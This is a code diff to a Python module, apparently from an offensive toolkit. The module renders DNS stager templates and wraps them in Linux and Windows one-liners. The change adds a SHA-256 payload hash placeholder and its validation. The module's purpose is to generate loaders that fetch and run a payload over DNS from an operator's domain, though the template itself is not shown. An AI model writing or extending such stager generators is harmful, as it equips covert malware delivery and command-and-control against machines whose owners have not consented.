@@ -6,6 +6,7 @@ DNS stager template rendering and one-liner generation.
 from __future__ import absolute_import
 
 import base64
+import hashlib
 import os
 import subprocess
 import zlib
@@ -19,6 +20,7 @@ _PLACEHOLDERS = (
     '{{BASE_DOMAIN}}',
     '{{CNAME_SUFFIX}}',
     '{{STAGER_NONCE}}',
+    '{{PAYLOAD_HASH}}',
     '{{SFB_ARGS}}',
     '{{RESOLVER_SNIPPET}}',
 )
@@ -185,6 +187,20 @@ def _normalize_stager_nonce(value):
     return value.lower()
 
 
+def _normalize_payload_hash(value):
+    if value is None:
+        raise ValueError('payload_hash required')
+    value = _ensure_ascii_text(value, 'payload_hash').strip().lower()
+    if not value:
+        raise ValueError('payload_hash required')
+    if len(value) != 64:
+        raise ValueError('payload_hash must be 64 hex characters')
+    for ch in value:
+        if ch not in '0123456789abcdef':
+            raise ValueError('payload_hash must be lowercase hex')
+    return value
+
+
 def _build_cname_suffix(base_domain, cname_label):
     cname_label = _normalize_cname_label(cname_label)
     if cname_label:
@@ -215,6 +231,14 @@ def _python_string_literal(value):
     return '\'' + _escape_python_string(value) + '\''
 
 
+def _payload_hash(payload_bytes):
+    if payload_bytes is None:
+        raise ValueError('payload_bytes required')
+    payload_text = _ensure_ascii_text(payload_bytes, 'payload')
+    payload_bytes = payload_text.encode('ascii')
+    return hashlib.sha256(payload_bytes).hexdigest()
+
+
 def _compress_payload(payload):
     payload = _ensure_ascii_text(payload, 'payload')
     compressed = zlib.compress(payload.encode('ascii'), 9)
@@ -235,11 +259,12 @@ def _format_args_list(args):
 
 
 def _render_template(template_text, base_domain, cname_suffix, stager_nonce,
-                     sfb_args, resolver_snippet):
+                     payload_hash, sfb_args, resolver_snippet):
     rendered = template_text
     rendered = rendered.replace('{{BASE_DOMAIN}}', base_domain)
     rendered = rendered.replace('{{CNAME_SUFFIX}}', cname_suffix)
     rendered = rendered.replace('{{STAGER_NONCE}}', stager_nonce)
+    rendered = rendered.replace('{{PAYLOAD_HASH}}', payload_hash)
     rendered = rendered.replace('{{SFB_ARGS}}', sfb_args)
     rendered = rendered.replace('{{RESOLVER_SNIPPET}}', resolver_snippet)
     for token in _PLACEHOLDERS:
@@ -249,11 +274,12 @@ def _render_template(template_text, base_domain, cname_suffix, stager_nonce,
 
 
 def render_dns_stager(template_path, base_domain, sfb_args, resolver_snippet,
-                      cname_label=None, stager_nonce=None):
+                      cname_label=None, stager_nonce=None, payload_hash=None):
     template_text = _read_ascii(template_path)
     base_domain = _normalize_domain(base_domain)
     cname_suffix = _build_cname_suffix(base_domain, cname_label)
     stager_nonce = _normalize_stager_nonce(stager_nonce)
+    payload_hash = _normalize_payload_hash(payload_hash)
     sfb_args = _format_args_list(sfb_args or [])
     resolver_snippet = _ensure_ascii_text(resolver_snippet, 'resolver snippet')
     return _render_template(
@@ -261,6 +287,7 @@ def render_dns_stager(template_path, base_domain, sfb_args, resolver_snippet,
         base_domain,
         cname_suffix,
         stager_nonce,
+        payload_hash,
         sfb_args,
         resolver_snippet,
     )
@@ -292,8 +319,8 @@ def build_one_liner(payload, platform):
     raise ValueError('Unknown platform: %s' % platform)
 
 
-def write_dns_stagers(base_domain, sfb_args=None, output_dir=None,
-                      template_path=None, cname_label=None,
+def write_dns_stagers(base_domain, sfb_args=None, payload_bytes=None,
+                      output_dir=None, template_path=None, cname_label=None,
                       stager_nonce=None):
     repo_root = _repo_root()
     if output_dir is None:
@@ -305,6 +332,7 @@ def write_dns_stagers(base_domain, sfb_args=None, output_dir=None,
             'stagers',
             'dns_stager_template.py',
         )
+    payload_hash = _payload_hash(payload_bytes)
     linux_payload = render_dns_stager(
         template_path,
         base_domain,
@@ -312,6 +340,7 @@ def write_dns_stagers(base_domain, sfb_args=None, output_dir=None,
         LINUX_RESOLVER_SNIPPET,
         cname_label=cname_label,
         stager_nonce=stager_nonce,
+        payload_hash=payload_hash,
     )
     windows_payload = render_dns_stager(
         template_path,
@@ -320,6 +349,7 @@ def write_dns_stagers(base_domain, sfb_args=None, output_dir=None,
         WINDOWS_RESOLVER_SNIPPET,
         cname_label=cname_label,
         stager_nonce=stager_nonce,
+        payload_hash=payload_hash,
     )
     linux_cmd = build_one_liner(linux_payload, platform='posix')
     windows_cmd = build_one_liner(windows_payload, platform='windows')
